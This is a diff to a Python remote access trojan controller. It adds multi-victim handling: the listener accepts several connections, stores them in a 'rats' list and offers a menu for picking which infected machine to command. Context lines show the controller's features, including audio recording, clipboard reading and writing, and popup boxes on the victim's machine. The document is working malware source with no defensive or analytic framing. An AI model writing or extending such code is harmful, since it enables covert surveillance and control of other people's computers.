@@ -9,9 +9,8 @@ from time import sleep
 from platform import system as osType
 from colorama import Fore,Back
 from os.path import isfile
-from os import system , getcwd
+from os import system
 from cryptography.fernet import Fernet
-from random import choice
 def clear():
     if "windows" in osType().lower():
         system("cls")
@@ -35,8 +34,10 @@ def clearBuffer(sock):
     sock.settimeout(0.5)
     while 1:
         try:
-            sock.recv(1000000)
-        except socket.timeout :
+            buffData=sock.recv(1000000)
+            if not buffData:
+                break
+        except socket.timeout:
             break
 def others(sock):
     clear()
@@ -428,6 +429,7 @@ def getSound(sock,sec):
     wf.writeframes(b''.join(frames))
     wf.close()
 def main(mode):
+    rats=[]
     host=input(f'{Fore.LIGHTYELLOW_EX}\n[*] Enter the host : {Fore.RESET}')
     clear()
     while 1:
@@ -446,14 +448,29 @@ def main(mode):
                     break
                 except ValueError:
                     pass
+            MLmode=0
+            while not (MLmode=='y' or MLmode=='n'):
+                MLmode=input(f"{Fore.LIGHTGREEN_EX}\n[*] Do you want to enable Multiple Clients[Y/n] ?").lower()
             sock.bind((host,port))
             sock.listen(lstnNum)
-            print(f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Waiting for the client ...{Fore.RESET}")
-            sock,addr=sock.accept()
+            if MLmode=='n':
+                print(f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Waiting for the client ...{Fore.RESET}")
+                sock,addr=sock.accept()
+            else :
+                print(f"{Fore.LIGHTGREEN_EX}[ * ] Please enter {Fore.LIGHTRED_EX}ctrl + c{Fore.LIGHTGREEN_EX} to finish accepting clients .{Fore.RESET}")
+                while 1:
+                    try:
+                        sockMain,addr=sock.accept()
+                        rats.append([sockMain , addr])
+                        print(f"\n{Fore.LIGHTGREEN_EX}[ * ] {addr[0]}:{addr[1]} was connected !")
+                    except KeyboardInterrupt:
+                        if len(rats):
+                            break
+                        print(f"\n\n{Fore.LIGHTRED_EX}_.-> [E] One of the clients must be connected to continue !! <-._{Fore.RESET}")
         elif mode =="client":
             sock.connect((host,port))
             
-    except :
+    except Exception as e:
         print(rf'''
 {Fore.LIGHTYELLOW_EX}    .-.                                {Fore.LIGHTGREEN_EX}_________{Fore.RESET}
 {Fore.LIGHTYELLOW_EX}   / _ \                              {Fore.LIGHTGREEN_EX}|{Fore.RESET}  {Fore.RED}Error{Fore.RESET}  {Fore.LIGHTGREEN_EX}|{Fore.RESET}
@@ -474,9 +491,31 @@ def main(mode):
    |`--'888888888 /
    |.' \      .'`/.
     `___)x/\x(__/_`
-    ///__/__\___\\\ {Fore.RESET}''')
+    ///__/__\___\\\ 
+    
+    E : {e}{Fore.RESET}''')
         exit()
+    extra=''
+    if MLmode=='y':
+        extra=f"                    {Fore.LIGHTGREEN_EX}[ 10 ] Return to the rats menu{Fore.RESET} "
+    addrs=""
+    for i in range(len(rats)):
+        addrs+=f"\n\n[ {i+1} ] {rats[i][1][0]}:{rats[i][1][1]}"
+    GratMenu=1
     while 1:
+        clear()
+        if MLmode=='y' and GratMenu:
+            while 1:
+                try:
+                    print(f"{Fore.LIGHTRED_EX}\n         [List of Rats]{Fore.RESET}")
+                    ratNumber=input(Fore.LIGHTCYAN_EX+addrs+'\n\n'+'Please select your RAT (Enter the number of the rat) : '+Fore.RESET)
+                    if  int(ratNumber) > 0 and int(ratNumber) <= len(rats):
+                        break
+                    print(f"{Fore.LIGHTRED_EX}\n\n[ E ] RAT number out of range!")
+                except ValueError:
+                    print(f"\n\n{Fore.LIGHTRED_EX}[ E ] Value Error enter the integer number !{Fore.RESET}")
+            GratMenu=0
+            sock=rats[int(ratNumber)-1][0]
         clearBuffer(sock)
         sock.settimeout(None)
         clear()
@@ -494,7 +533,7 @@ def main(mode):
      {Fore.CYAN}L      `--'\{Fore.RESET}
     {Fore.CYAN} |           \{Fore.RESET}     {Fore.LIGHTGREEN_EX}[ 7 ] Make custom popup box{Fore.RESET}    {Fore.LIGHTGREEN_EX}[ 8 ] Read/write clipboard{Fore.RESET} 
     {Fore.CYAN} J            \{Fore.RESET}
-    {Fore.CYAN}  \         /  \{Fore.RESET}   {Fore.LIGHTGREEN_EX}[ 9 ] Other{Fore.RESET}                
+    {Fore.CYAN}  \         /  \{Fore.RESET}   {Fore.LIGHTGREEN_EX}[ 9 ] Other{Fore.RESET}{extra}
      {Fore.CYAN}  \      .'`.  `.                                  .'
      ___) /\ (____`.  `-._____________________________.'/
   _///__/__\___\\\_`-.______________________________.-'___
@@ -553,3 +592,6 @@ Enter your selection : """)
                 others(sock)
             except KeyboardInterrupt:
                 pass
+        elif selection=='10':
+            if MLmode=='y':
+                GratMenu=1
